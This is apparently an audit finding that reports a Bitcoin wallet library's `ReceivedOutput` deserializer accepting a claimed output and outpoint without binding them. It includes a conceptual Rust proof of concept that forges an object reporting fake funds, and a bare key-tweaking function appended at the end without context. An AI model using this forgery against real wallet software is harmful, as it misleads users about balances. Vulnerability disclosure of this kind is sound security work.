### Title
Forged `ReceivedOutput` can report unspendable outputs as wallet funds - (`networks/bitcoin/src/wallet/mod.rs`)

### Summary
**Severity: Medium.** `ReceivedOutput` bundles a scalar offset, a claimed `TxOut`, and a claimed `OutPoint`, but its deserializer accepts all three independently without proving that the `OutPoint` references the supplied `TxOut` or a spendable on-chain output. [1](#0-0) [2](#0-1) 

### Finding Description
`ReceivedOutput::read` is a public deserialization API which accepts untrusted bytes and directly constructs a supposedly spendable output from the embedded `offset`, `output`, and `outpoint` fields. [2](#0-1) 

`SignableTransaction::new` trusts the embedded `output.value` when calculating available input funds and uses the embedded `outpoint` as the transaction input being spent. [3](#0-2) 

The later `multisig` check verifies that the supplied offset produces the script in the claimed `TxOut`, but it never verifies that `previous_output` resolves to that same `TxOut`. [4](#0-3) 

This is analogous to checking authorization for `tokenId` while debiting an unrelated `from`: ownership is checked against attacker-supplied `TxOut` metadata, while the resource actually referenced by the transaction is the independently supplied `OutPoint`. [4](#0-3) 

### Impact Explanation
An attacker who knows the wallet’s public Taproot script can serialize an offset such as zero, a high-value `TxOut` paying that script, and an unrelated or nonexistent `OutPoint`. [5](#0-4) [2](#0-1) 

A caller treating the decoded `ReceivedOutput` as a verified receive can report the fake `output.value` as wallet funds even though the referenced `OutPoint` is not controlled by the wallet or does not contain the claimed output. [6](#0-5) [3](#0-2) 

The mismatch also passes `SignableTransaction::multisig` because the script check is applied to the serialized `prevouts` entry rather than to chain-verified data for `tx.input.previous_output`. [4](#0-3) 

### Likelihood Explanation
The attack requires only the wallet’s public Taproot address/script and arbitrary bytes passed to `ReceivedOutput::read`; it does not require a private key, a validator, or control of an existing wallet output. [5](#0-4) [2](#0-1) 

The forged input cannot make Bitcoin consensus transfer a mismatched victim UTXO, since the transaction actually names `previous_output`, so the primary impact is false reporting of unavailable wallet funds and construction of transactions which cannot validly spend the claimed value. [7](#0-6) [8](#0-7) 

### Recommendation
Do not treat `ReceivedOutput::read` as producing a verified spendable output. Bind the `OutPoint` to its `TxOut` by resolving the outpoint against a trusted blockchain source and requiring the returned output’s `script_pubkey` and amount to equal the stored `TxOut` before constructing `ReceivedOutput` or `SignableTransaction`. [2](#0-1) [3](#0-2) 

Alternatively, split the API into an unverified serialized representation and a verified `ReceivedOutput` constructible only by `Scanner` or a chain-backed UTXO lookup, and have `multisig` check the confirmed prevout for each `tx.input.previous_output`. [9](#0-8) [4](#0-3) 

### Proof of Concept
The following conceptual PoC assumes `keys` has already been passed through `tweak_keys`, so `p2tr_script_buf(keys.group_key())` is the wallet’s public Taproot deposit script. [10](#0-9) [5](#0-4) 

```rust
use std::io::Cursor;

use bitcoin::{
  consensus::encode::serialize,
  Amount, OutPoint, ScriptBuf, TxOut, Txid,
};
use k256::Scalar;
use networks_bitcoin::wallet::{
  p2tr_script_buf, tweak_keys, ReceivedOutput, SignableTransaction, DUST,
};

// Public wallet keys/script.
let keys = tweak_keys(raw_keys);
let wallet_script: ScriptBuf = p2tr_script_buf(keys.group_key()).unwrap();

// Claim a high-value output paying the wallet.
let claimed_output = TxOut {
  value: Amount::from_sat(100_000_000),
  script_pubkey: wallet_script,
};

// Point the actual input at an unrelated victim UTXO or a nonexistent outpoint.
let unrelated_outpoint = OutPoint {
  txid: victim_or_fake_txid,
  vout: 0,
};

// Serialize a forged ReceivedOutput:
// offset = 0, output = claimed_output, outpoint = unrelated_outpoint.
let mut bytes = Vec::new();
bytes.extend_from_slice(&Scalar::ZERO.to_bytes());
bytes.extend_from_slice(&serialize(&claimed_output));
bytes.extend_from_slice(&serialize(&unrelated_outpoint));

// The public reader accepts all three independently supplied fields.
let forged = ReceivedOutput::read(&mut Cursor::new(bytes)).unwrap();

// The forged object reports the claimed value as received funds.
assert_eq!(forged.value(), 100_000_000);
assert_eq!(forged.outpoint(), &unrelated_outpoint);

// SignableTransaction counts the claimed value and spends the unrelated outpoint.
let signable = SignableTransaction::new(
  vec![forged],
  &[(payment_script, DUST)],
  Some(change_script),
  None,
  fee_per_vbyte,
).unwrap();

// This succeeds because it checks only that the claimed TxOut script matches
// keys.offset(0); it does not prove unrelated_outpoint contains that TxOut.
let machine = signable.multisig(&keys).unwrap();
```

The resulting machine signs over `self.prevouts`, which are copied from the forged `output`, while the transaction input references `unrelated_outpoint`; if the real UTXO differs or does not exist, the reported funds are not actually spendable. [11](#0-10) [8](#0-7)

pub fn tweak_keys(keys: ThresholdKeys<Secp256k1>) -> ThresholdKeys<Secp256k1> {
  // Adds the unspendable script path per
  // https://github.com/bitcoin/bips/blob/master/bip-0341.mediawiki#cite_note-23
  let keys = {
    use k256::elliptic_curve::{
      bigint::{Encoding, U256},
      ops::Reduce,
      group::GroupEncoding,
    };
    let tweak_hash = TapTweakHash::hash(&keys.group_key().to_bytes().as_slice()[1 ..]);
    /*
      https://github.com/bitcoin/bips/blob/master/bip-0340.mediawiki#cite_ref-13-0 states how the
      bias is negligible. This reduction shouldn't ever occur, yet if it did, the script path
      would be unusable due to a check the script path hash is less than the order. That doesn't
      impact us as we don't want the script path to be usable.
    */
    keys.offset(<Secp256k1 as Ciphersuite>::F::reduce(U256::from_be_bytes(
      *tweak_hash.to_raw_hash().as_ref(),
    )))
  };

  let needs_negation = needs_negation(&keys.group_key());
  keys
    .scale(<_ as subtle::ConditionallySelectable>::conditional_select(
      &Scalar::ONE,
      &-Scalar::ONE,
      needs_negation,
    ))
    .expect("scaling keys by 1 or -1 yet interpreted as 0?")
}
